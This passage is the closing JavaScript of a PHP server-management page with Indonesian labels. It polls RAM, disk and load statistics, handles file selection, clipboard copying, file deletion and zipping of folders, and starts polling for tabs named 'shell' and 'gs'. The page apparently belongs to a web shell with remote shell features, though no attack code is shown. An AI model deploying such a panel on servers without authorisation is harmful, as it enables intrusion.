        var ramp = document.getElementById('stat-ram-pct');
        if (ramp) { ramp.textContent = '(' + d.mem_pct + '% used)'; ramp.style.color = d.mem_pct > 90 ? '#ff7b72' : (d.mem_pct > 70 ? '#e3b341' : '#8e99ab'); }
        var dsk = document.getElementById('stat-disk'); if (dsk) dsk.textContent = fmtSize(d.disk_free);
        var dskt = document.getElementById('stat-disk-total'); if (dskt) dskt.textContent = fmtSize(d.disk_total);
        var dskp = document.getElementById('stat-disk-pct');
        if (dskp) { dskp.textContent = '(' + d.disk_pct + '% used)'; dskp.style.color = d.disk_pct > 90 ? '#ff7b72' : (d.disk_pct > 70 ? '#e3b341' : '#8e99ab'); }
        var ld = document.getElementById('stat-load'); if (ld) ld.textContent = d.load;
    };
    x.send(null);
}
document.addEventListener('DOMContentLoaded', function() {
    toggleActionBar();
});
function toggleAll(source) {
    var checkboxes = document.querySelectorAll('.chkbox');
    for (var i = 0; i < checkboxes.length; i++) {
        checkboxes[i].checked = source.checked;
    }
    toggleActionBar();
}
function widCopyFallback(text) {
    var ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed'; ta.style.opacity = '0';
    document.body.appendChild(ta); ta.select();
    try { document.execCommand('copy'); } catch (e) {}
    document.body.removeChild(ta);
}
function widCopyText(btn, text, label) {
    var finish = function () {
        var oldLabel = btn.textContent;
        btn.textContent = label;
        setTimeout(function () { btn.textContent = oldLabel; }, 1200);
    };
    if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(text).then(finish, function () { widCopyFallback(text); finish(); });
    } else { widCopyFallback(text); finish(); }
}
function toggleActionBar() {
    var bar = document.getElementById('batchActionBar');
    if (!bar) return;
    var checked = document.querySelectorAll('.chkbox:checked').length;
    if (checked > 0) {
        bar.style.display = 'flex';
    } else {
        bar.style.display = 'none';
    }
}
function confirmDelete(path, target) {
    if (!confirm('Yakin hapus ' + target + '?')) return;
    document.getElementById('delPath').value = path;
    document.getElementById('delTarget').value = target;
    document.getElementById('delForm').submit();
}
function confirmZipFolder(path, target) {
    if (!confirm('Download folder ' + target + ' sebagai ZIP?')) return;
    document.getElementById('zipPath').value = path;
    document.getElementById('zipTarget').value = target;
    document.getElementById('zipFolderForm').submit();
}
statPoll(); setInterval(statPoll, 1500);
<?php if ($tab === 'gs'): ?>gsPoll(); setInterval(gsPoll, 3000);<?php endif; ?>
<?php if ($tab === 'shell'): ?>rctPoll(); setInterval(rctPoll, 3000);<?php endif; ?>
</script>
</body>
</html>
